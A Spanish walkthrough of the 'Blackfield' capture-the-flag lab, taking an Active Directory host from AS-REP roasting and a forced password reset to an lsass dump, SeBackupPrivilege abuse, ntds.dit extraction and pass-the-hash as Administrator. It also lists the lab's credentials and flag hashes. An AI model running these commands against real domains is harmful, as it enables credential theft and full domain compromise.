puerto 88 kerberos, 389 ldap, 445 smb, 5985 administracion remota de windows

Como el puerto 445 esta abierto, usar crackmapexec para encontrar mas informacion sobre la maquina victima
```
crackmapexec smb 10.10.10.192
```

Como el smb esta abierto, usar smbmap para buscar recursos compartidos a nivel de red del lado de la victima

```
smbmap -H 10.10.10.192 -u 'null'
```

Encontre un recurso compartido con permisos de lectura
```
smbmap  -H 10.10.10.192 -u 'null' -r 'profiles$'
```

Reporta una lista de nombres de usuarios
```
smbmap -H 10.10.10.192 -u 'null' -r 'profiles$' | awk 'NF{print $NF}' > users
```

Ahora con kerbrute validar que usuarios son validos

```
kerbrute userenum --dc 10.10.10.192 -d blackfield.local users
```

De eta forma valide algunos usuarios , ahora podemos efectuar el ataque ASREPRoast usando GetNPUusers

```
GetNPUusers blackfield.local/ -no-pass -usersfile valid_users
```

Ahora tenemos un usuario valido y su hash, con john puedo crackear ese hash

```
john --wordlist=rockyou hash
$krb5asrep$23$support@BLACKFIELD.LOCAL:#00^BlackKnight
```

Ahora teniendo ceredenciales validas hacer un kerberoastingattack

```
GetUserSPNs 'blackfield.local/support:password'
```

este usuario no es kerberoastiable

Comprobar con crackmapexec que las credenciales son validas

```
crackmapexec smb 10.10.10.192 -u 'user' -p 'pass'
```

Ahora que eta comprobado que estas credenciales son validas, usar smbmap para listar los recursos compartidos de este usuario

```
smbmap -H 10.10.10.192 -u 'support' -p 'passwd'
```

No hay nada nuevo con este usuario, asi que hay que probar otra cosa.
podemos usar ldapdomaindump  para enumerar informacion de llos usuarios activos, y extraer informacion, tambien probar con rpcclient y su funcion enumdomusers

```
ldapdomaindump -u 'blackfield.local\support' -p 'passwd' 10.10.10.192
rpcclient -U "support%passwd" 10.10.10.192
rpcclient enumdomusers
```

Ahora tenemos informacion de grupos y usuarios del dominio, puedo tratar de cambiar alguna contraseña de los usuarios encontrados

```
net rpc password audit2020 -U 'support' -S 10.10.10.192
```

comprobar con crackmapexec que se cambio correctamente la contraseña

```
crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'pass123@'
```

ahroa que tenemos una nueva credencial podermos ver que recursos compartidos tiene este nuevo usuario usando smbmap

```
smbmap -H 10.10.10.192 -u 'audit2020' -p 'pass123@'
```

Con este usuario tenemos acceso a un nuevo recuros (forensic)

```
smbmap -H 10.10.10.192 -u 'audit2020' -p 'pass123@' -r forensic
```

Encuentro reucrsos interesantes y los enumero

```
smbmap -H 10.10.10.192 -u 'audit2020' -p 'pass123@' -r forensic/memory_analysis
```

Hay uno que llama la atencion por su nombre "lsass" 
puedo usar la herramienta pypykatz para dumpiar lsass
primero descargo ese archivo a mi equipo

```
smbmap -H 10.10.10.192 -u 'audit2020' -p 'pass123@' --download forensic/memory_analysis/lsass.zip
7z x lsass.zup
```

Ahora con la herramienta pypykatz obtener informacion privilegiado aprovechanonos de ese dump lsass:
```
pypykatz lsa minidump lsass.DMP
```

Asi obenetemos el hash del usuario svc_backup el cual esta en el grupo remote management users, este usuario se puede autenticar al winrm
podemos validar con crackmapexec ese hash

```
crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```

Ahora validar se se puede conectar por winrm

```
crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H 'NThash'
```

comoo pone Pwn3d! asi validamos que podemos ganar acceso a la maquina, ahora con evil-winrm ganamos acceso a la maquina victima
```
evil-winrm -i 10.10.10.192 -u 'svc_backup' -H 'hash'
```

Ahora hay que escalar privilegios:
Enumerar el usuario
```
whoami /priv
# SeBackupPrivilege

```

Con ese privilegio puedo hacer un backup de lo que quiera en el sistema
Creamos una copia del system

```
reg save HKLM\system system
download C:\Temp\system
```

Crear uina copia del ntds.dit

Crear una unidad logica con diskshadow https://pentestlab.blog/tag/diskshadow/:
``` 
# crear un archivo de texto con esto:  
set context persistent nowriters  
add volume c: alias someAlias  
create  
expose %someAlias% z:  
# subirlo a la maquina victima upload test.txt  #en la maquina victima diskshadow.exe /s c:\Temp\test.txt 
```  

Ahora podemos crear la copia del ntds.dit 
``` 
robocopy /b z:\Windows\NTDS\ . ntds.dit ahora descargamos el ntds.dit 
```  

Y ahora con el secretsdump :
```  
secretsdump -system system -ntds ntds.dit LOCAL
```  

ASi obtenemos el hash de administrador del DC

ahora con crackmapexec comprovamos estas credenciales

```
crackmapexec smb 10.10.10.192 -u 'Administrator' -H 'NTdshash'
```

Ahora con evil-winrm puedo ganar acceso a la maquina como Administrador

```
evil-winrm -i 10.10.10.192 -u 'Administrator' -H 'hash'
```

user hash > 3920bb317a0bef51027e2852be64b543
root hash > 4375a629c7c67c8e29db269060c955cb